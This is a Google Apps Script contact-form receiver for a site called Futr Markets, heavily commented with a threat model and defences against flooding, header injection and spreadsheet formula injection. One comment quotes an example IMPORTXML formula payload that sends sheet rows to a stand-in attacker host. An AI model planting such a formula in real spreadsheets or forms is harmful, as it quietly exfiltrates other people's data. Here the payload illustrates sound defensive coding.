/**
 * Futr Markets — contact form receiver.
 *
 * Paste this into a Google Apps Script project bound to a Google Sheet. It
 * appends every enquiry as a row and emails a notification. Data stays in
 * Futr's own Drive — no third-party form vendor, no monthly cost.
 *
 * ── Setup ────────────────────────────────────────────────────────────────
 *
 *  1. Create a Google Sheet. Name the first tab "Enquiries".
 *  2. Extensions → Apps Script. Delete the placeholder and paste this file.
 *  3. Set NOTIFY_TO below to the address that should receive enquiries.
 *  4. Deploy → New deployment → type "Web app".
 *       Execute as:        Me
 *       Who has access:    Anyone
 *     ("Anyone" is required — the website posts without a Google login. The
 *      script only ever appends; it never reads or returns sheet data.)
 *  5. Copy the /exec URL it gives you.
 *  6. In the site's public/config.json (no rebuild needed):
 *       "provider": "sheets",
 *       "endpoint": "<the /exec URL>"
 *     Or, for a CI build, in .env:
 *       VITE_CONTACT_PROVIDER=sheets
 *       VITE_CONTACT_ENDPOINT=<the /exec URL>
 *
 * ── Note on CORS ─────────────────────────────────────────────────────────
 *
 * Apps Script does not send CORS headers, so the site posts with
 * Content-Type: text/plain — a "simple" request the browser sends without a
 * preflight. That is why this parses e.postData.contents as JSON rather than
 * reading e.parameter.
 *
 * ── Threat model ─────────────────────────────────────────────────────────
 *
 * This URL is public and unauthenticated — that is forced by the deployment
 * ("Anyone"), because a website visitor has no Google login to present. So
 * assume anyone can POST anything here, as often as they like, and that the
 * client-side honeypot and timing checks were simply skipped. Everything
 * below is written on that assumption:
 *
 *   · Spreadsheet formula injection — a value like `=IMPORTXML(...)` becomes
 *     a live formula the moment someone opens the sheet, and can quietly ship
 *     the rest of the sheet to an attacker's server. Every user-supplied cell
 *     is written as literal text (see setValuesAsText).
 *   · Flooding — an unthrottled public endpoint can fill the sheet and burn
 *     the daily MailApp quota, after which real enquiries arrive with no
 *     notification. Rate-limited below, and the sheet write is deliberately
 *     kept working even once the mail quota is gone.
 *   · Error disclosure — internal failures are logged, never returned.
 */

/** Where new enquiries are emailed. Replace before deploying. */
var NOTIFY_TO = 'info@futrmarkets.com'

/** Tab name inside the bound spreadsheet. */
var SHEET_NAME = 'Enquiries'

/**
 * Per-field caps. These mirror LIMITS in src/lib/contact-schema.js — the
 * client enforces them so a real person gets a useful message instead of a
 * silent truncation, and this enforces them again because the client can be
 * bypassed entirely.
 */
var LIMITS = {
  name: 120,
  company: 160,
  email: 254, // RFC 5321 maximum
  phone: 40,
  subject: 200,
  message: 4000,
  userType: 40,
  source: 200,
}

/** Reject a body larger than any legitimate enquiry before parsing it. */
var MAX_BODY_BYTES = 32 * 1024

/** At most this many accepted enquiries per rolling window, site-wide. */
var RATE_MAX = 20
var RATE_WINDOW_SECONDS = 600 // 10 minutes

/** Identical re-posts inside this window are treated as a double-submit. */
var DEDUPE_SECONDS = 120

var HEADERS = [
  'Received',
  'User type',
  'Name',
  'Company',
  'Email',
  'Phone',
  'Subject',
  'Message',
  'Source page',
]

function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return json({ ok: false, error: 'Bad request' })
    }
    if (e.postData.contents.length > MAX_BODY_BYTES) {
      return json({ ok: false, error: 'Payload too large' })
    }

    var data
    try {
      data = JSON.parse(e.postData.contents)
    } catch (parseErr) {
      return json({ ok: false, error: 'Bad request' })
    }
    if (!data || typeof data !== 'object') {
      return json({ ok: false, error: 'Bad request' })
    }

    // Server-side honeypot. The site strips this field before sending, so if a
    // value arrives here it bypassed the client entirely — drop it, but return
    // success so the sender learns nothing.
    if (data.website) {
      return json({ ok: true })
    }

    var clean = normalise(data)
    var invalid = firstValidationError(clean)
    if (invalid) {
      return json({ ok: false, error: invalid })
    }

    // Serialise everything past this point. Two simultaneous requests can
    // otherwise both read "last row = 40" and write over each other, and both
    // can slip past the rate check in the same instant.
    var lock = LockService.getScriptLock()
    if (!lock.tryLock(10000)) {
      return json({ ok: false, error: 'Busy, please retry' })
    }

    try {
      // A repeat of a message we have already stored is a double-click or a
      // retry after a flaky response, not a second enquiry. Answer success so
      // the sender stops retrying, but do not write the row twice.
      if (isDuplicate(clean)) {
        return json({ ok: true })
      }
      if (isRateLimited()) {
        // Deliberately vague, and deliberately not an error the site shows as
        // a failure: a flooder learns nothing, and the worst case for a real
        // visitor caught in a burst is that they retry.
        return json({ ok: false, error: 'Temporarily unavailable' })
      }

      appendEnquiry(clean)
      rememberSubmission(clean)
    } finally {
      lock.releaseLock()
    }

    // The row is safely written. A notification failure past this point must
    // not be reported as a failed submission — the client would retry and we
    // would store the enquiry twice.
    try {
      notify(clean)
    } catch (mailErr) {
      console.error('Enquiry stored but notification failed: ' + mailErr)
    }

    return json({ ok: true })
  } catch (err) {
    // Logged for the sheet owner, never returned: the message can name
    // internal sheets, ranges and script internals.
    console.error('doPost failed: ' + (err && err.stack ? err.stack : err))
    return json({ ok: false, error: 'Could not store enquiry' })
  }
}

/** Browsers may probe the URL; answer politely rather than 500. */
function doGet() {
  return json({ ok: true, service: 'Futr Markets enquiry receiver' })
}

/* ── Input handling ─────────────────────────────────────────────────────── */

/** Coerces every expected field to a trimmed, length-capped string. */
function normalise(data) {
  return {
    userType: clamp(data.userType, LIMITS.userType),
    name: clamp(data.name, LIMITS.name),
    company: clamp(data.company, LIMITS.company),
    email: clamp(data.email, LIMITS.email),
    phone: clamp(data.phone, LIMITS.phone),
    subject: clamp(data.subject, LIMITS.subject),
    // The one field where a line break is content rather than an attack.
    message: clamp(data.message, LIMITS.message, true),
    source: clamp(data.source, LIMITS.source),
  }
}

/**
 * Coerces one field to a trimmed, length-capped, control-character-free string.
 *
 * Anything that is not a primitive becomes an empty string rather than
 * "[object Object]" — a posted array or nested object is not a name.
 *
 * Control characters are stripped because a CR/LF inside `subject` is how a
 * sender tries to append its own headers to the notification email, and
 * because a NUL or escape sequence in a sheet cell is never legitimate.
 * Newlines survive only in the field that says they are content.
 */
function clamp(value, max, allowNewlines) {
  if (value == null) return ''
  var type = typeof value
  if (type !== 'string' && type !== 'number' && type !== 'boolean') return ''

  var raw = String(value)
  var s = allowNewlines
    ? raw.replace(/\r\n?/g, '\n').replace(/[\x00-\x09\x0B-\x1F\x7F]/g, ' ')
    : raw.replace(/[\x00-\x1F\x7F]/g, ' ')
  s = s.trim()
  return s.length > max ? s.slice(0, max) : s
}

function firstValidationError(d) {
  if (!d.name) return 'Name is required'
  if (!d.email) return 'Email is required'
  if (!isEmail(d.email)) return 'Email is not valid'
  if (!d.message) return 'Message is required'
  return null
}

/**
 * Deliberately permissive — this guards the `replyTo` header and keeps
 * obvious junk out of the sheet. Address validity is proven by a reply
 * arriving, not by a regex.
 */
function isEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value)
}

/* ── Sheet ──────────────────────────────────────────────────────────────── */

function appendEnquiry(d) {
  var sheet = getSheet()
  var row = sheet.getLastRow() + 1

  // The timestamp is ours, so it can be a real Date — sorting and filtering on
  // a text column would be miserable.
  sheet.getRange(row, 1).setValue(new Date())

  // Everything from here is attacker-controlled and is written as text.
  setValuesAsText(sheet, row, 2, [
    d.userType,
    d.name,
    d.company,
    d.email,
    d.phone,
    d.subject,
    d.message,
    d.source,
  ])
}

/**
 * Writes user-supplied values so Sheets can never evaluate them.
 *
 * `appendRow` and `setValue` both parse what they are given: a name of
 * `=IMPORTXML("https://evil.test?x="&CONCATENATE(A1:I1),"//a")` is stored as a
 * live formula, and it runs — exfiltrating the row, or the whole sheet — as
 * soon as anyone at Futr opens the tab. The same trick with `=HYPERLINK` turns
 * a cell into a phishing link that looks like it came from the sender.
 *
 * Setting the number format to '@' (plain text) *before* writing makes Sheets
 * store the characters verbatim, leading `=`, `+`, `-` and `@` included. The
 * cell shows exactly what was typed and evaluates nothing. Formatting first
 * and writing second is the part that matters — doing it the other way round
 * formats a formula that has already been parsed.
 */
function setValuesAsText(sheet, row, startColumn, values) {
  var range = sheet.getRange(row, startColumn, 1, values.length)
  range.setNumberFormat('@')
  range.setValues([values])
}

function getSheet() {
  var ss = SpreadsheetApp.getActiveSpreadsheet()
  var sheet = ss.getSheetByName(SHEET_NAME)

  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME)
  }
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS)
    sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold')
    sheet.setFrozenRows(1)
  }
  return sheet
}

/* ── Abuse control ──────────────────────────────────────────────────────── */

/**
 * Apps Script never sees the caller's IP, so a per-sender limit is not
 * available. This caps the endpoint as a whole instead, which is the thing
 * actually worth protecting: the sheet and the daily mail quota.
 *
 * CacheService is used rather than PropertiesService because these counters
 * are meant to expire on their own, and because Properties has a hard quota
 * that a flood would otherwise consume.
 */
function isRateLimited() {
  var cache = CacheService.getScriptCache()
  var key = 'rate:' + Math.floor(nowSeconds() / RATE_WINDOW_SECONDS)
  var count = Number(cache.get(key) || 0)
  if (count >= RATE_MAX) return true
  cache.put(key, String(count + 1), RATE_WINDOW_SECONDS + 60)
  return false
}

function submissionKey(d) {
  // Content-addressed, so a resend of the same enquiry collides with itself
  // while two different people writing in at once do not. The digest keeps the
  // key inside the 250-character cache-key limit and keeps the plaintext of
  // someone's message out of the cache.
  var raw = d.email + '|' + d.subject + '|' + d.message
  var bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, raw, Utilities.Charset.UTF_8)
  var hex = ''
  for (var i = 0; i < bytes.length; i++) {
    hex += ('0' + (bytes[i] & 0xff).toString(16)).slice(-2)
  }
  return 'dupe:' + hex
}

function isDuplicate(d) {
  return CacheService.getScriptCache().get(submissionKey(d)) !== null
}

function rememberSubmission(d) {
  CacheService.getScriptCache().put(submissionKey(d), '1', DEDUPE_SECONDS)
}

function nowSeconds() {
  return Math.floor(new Date().getTime() / 1000)
}

/* ── Notification ───────────────────────────────────────────────────────── */

function notify(d) {
  if (!NOTIFY_TO) return

  // Once the daily quota is gone every send throws. Checking first keeps that
  // out of the logs and makes it obvious in the execution log why mail stopped
  // while rows kept arriving.
  if (MailApp.getRemainingDailyQuota() <= 0) {
    console.warn('MailApp daily quota exhausted — enquiry stored without notification.')
    return
  }

  var lines = [
    'New enquiry from the Futr Markets website.',
    '',
    'Type:     ' + (d.userType || '—'),
    'Name:     ' + (d.name || '—'),
    'Company:  ' + (d.company || '—'),
    'Email:    ' + (d.email || '—'),
    'Phone:    ' + (d.phone || '—'),
    '',
    'Subject:  ' + (d.subject || '—'),
    '',
    d.message || '',
  ]

  MailApp.sendEmail({
    to: NOTIFY_TO,
    // Send from the script owner, not the visitor — spoofing the sender
    // address is what gets a domain's mail marked as spam. The subject is
    // user-supplied, so it is prefixed and already stripped of control
    // characters by clamp(); a bare newline here would let a sender inject
    // their own headers.
    subject: '[Futr] ' + (d.subject || 'Website enquiry'),
    // Plain text only. An HTML body built from these values would be a
    // stored-XSS delivery vehicle aimed at whoever reads the inbox.
    body: lines.join('\n'),
    // Validated above, so this cannot be used to point replies somewhere
    // syntactically broken.
    replyTo: d.email || undefined,
    name: 'Futr Markets Website',
  })
}

/* ── Output ─────────────────────────────────────────────────────────────── */

function json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(
    ContentService.MimeType.JSON
  )
}
